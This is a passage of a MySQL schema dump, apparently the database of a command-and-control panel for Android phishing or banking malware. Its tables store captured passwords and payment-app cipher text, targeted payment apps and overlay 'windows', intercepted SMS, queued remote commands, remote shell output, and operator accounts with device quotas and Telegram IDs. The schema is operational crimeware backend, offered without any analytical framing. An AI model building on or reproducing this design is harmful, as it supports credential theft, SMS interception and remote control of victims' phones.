  `end_ip` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `start_num` bigint unsigned NOT NULL DEFAULT '0',
  `end_num` bigint unsigned NOT NULL DEFAULT '0',
  `country` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `province` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `city` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `isp` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  KEY `idx_start_num` (`start_num`),
  KEY `idx_end_num` (`end_num`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_login_logs` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `ip` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_agent` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `success` tinyint unsigned NOT NULL DEFAULT '0',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_username` (`username`),
  KEY `idx_created` (`created_at`)
) ENGINE=InnoDB AUTO_INCREMENT=27 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_operation_logs` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `log_type` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `content` longtext COLLATE utf8mb4_unicode_ci,
  `timestamp` bigint unsigned NOT NULL DEFAULT '0',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_device` (`device_id`),
  KEY `idx_type` (`log_type`),
  KEY `idx_created` (`created_at`)
) ENGINE=InnoDB AUTO_INCREMENT=3691 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_passwords` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `cipher_type` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `cipher_text` text COLLATE utf8mb4_unicode_ci,
  `grade_code` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `source` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_device` (`device_id`),
  KEY `idx_type` (`cipher_type`),
  KEY `idx_created` (`created_at`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_payment_cipher_records` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `package_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `app_name` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `cipher_text` text COLLATE utf8mb4_unicode_ci,
  `cipher_type` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `source` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_device` (`device_id`),
  KEY `idx_package` (`package_name`),
  KEY `idx_created` (`created_at`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_payment_strategies` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `package_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `app_name` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `windows` mediumtext COLLATE utf8mb4_unicode_ci,
  `enabled` tinyint unsigned NOT NULL DEFAULT '1',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_package` (`package_name`),
  KEY `idx_enabled` (`enabled`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_pending_commands` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `command_json` longtext COLLATE utf8mb4_unicode_ci,
  `picked_at` int unsigned NOT NULL DEFAULT '0',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_device` (`device_id`),
  KEY `idx_picked` (`picked_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_permission_menus` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `parent_id` int unsigned NOT NULL DEFAULT '0',
  `name` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `title` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `icon` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `path` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `component` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `sort` int unsigned NOT NULL DEFAULT '0',
  `visible` tinyint unsigned NOT NULL DEFAULT '1',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_parent` (`parent_id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_role_permissions` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `role` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `permission_key` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_role_perm` (`role`,`permission_key`)
) ENGINE=InnoDB AUTO_INCREMENT=19 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_secrets` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `secret_name` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `secret_value` text COLLATE utf8mb4_unicode_ci,
  `secret_type` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `description` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  `updated_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_secret_name` (`secret_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_sensitive_apps` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `package_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `app_name` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_package` (`package_name`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_settings` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `key` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `value` longtext COLLATE utf8mb4_unicode_ci,
  `created_at` int unsigned NOT NULL DEFAULT '0',
  `updated_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_settings_key` (`key`)
) ENGINE=InnoDB AUTO_INCREMENT=64 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_shell_history` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `command` text COLLATE utf8mb4_unicode_ci,
  `exit_code` int NOT NULL DEFAULT '-1',
  `stdout` longtext COLLATE utf8mb4_unicode_ci,
  `stderr` longtext COLLATE utf8mb4_unicode_ci,
  `executor_username` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_device` (`device_id`),
  KEY `idx_created` (`created_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_shizuku_sessions` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `status` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `reader_mode` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `started_at` int unsigned NOT NULL DEFAULT '0',
  `ended_at` int unsigned NOT NULL DEFAULT '0',
  `last_ping` int unsigned NOT NULL DEFAULT '0',
  `error_message` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  KEY `idx_device` (`device_id`),
  KEY `idx_status` (`status`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_sms_messages` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `address` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `body` text COLLATE utf8mb4_unicode_ci,
  `date` bigint unsigned NOT NULL DEFAULT '0',
  `type` tinyint unsigned NOT NULL DEFAULT '0',
  `read` tinyint unsigned NOT NULL DEFAULT '0',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_device` (`device_id`),
  KEY `idx_date` (`date`),
  KEY `idx_address` (`address`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_stat_snapshots` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `snapshot_date` date NOT NULL,
  `total_users` int unsigned NOT NULL DEFAULT '0',
  `total_devices` int unsigned NOT NULL DEFAULT '0',
  `online_devices` int unsigned NOT NULL DEFAULT '0',
  `total_apks` int unsigned NOT NULL DEFAULT '0',
  `new_devices_today` int unsigned NOT NULL DEFAULT '0',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_date` (`snapshot_date`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_system_notices` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `content` longtext COLLATE utf8mb4_unicode_ci,
  `type` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'info',
  `target_role` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `enabled` tinyint unsigned NOT NULL DEFAULT '1',
  `sort` int unsigned NOT NULL DEFAULT '0',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_enabled` (`enabled`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_uploads` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `filename` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `file_path` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `file_size` bigint unsigned NOT NULL DEFAULT '0',
  `mime_type` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `owner_username` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_device` (`device_id`),
  KEY `idx_owner` (`owner_username`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_users` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `password_hash` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `role` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'user',
  `permissions` text COLLATE utf8mb4_unicode_ci,
  `max_devices` int unsigned NOT NULL DEFAULT '100',
  `max_sub_users` int unsigned NOT NULL DEFAULT '0',
  `parent_username` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `enabled` tinyint unsigned NOT NULL DEFAULT '1',
  `allow_multi_login` tinyint unsigned NOT NULL DEFAULT '1',
  `expire_at` int unsigned NOT NULL DEFAULT '0',
  `avatar` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `telegram_chat_id` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `last_login_at` int unsigned NOT NULL DEFAULT '0',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  `updated_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_username` (`username`),
  KEY `idx_role` (`role`),
  KEY `idx_parent` (`parent_username`),
  KEY `idx_enabled` (`enabled`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
SET FOREIGN_KEY_CHECKS=1;
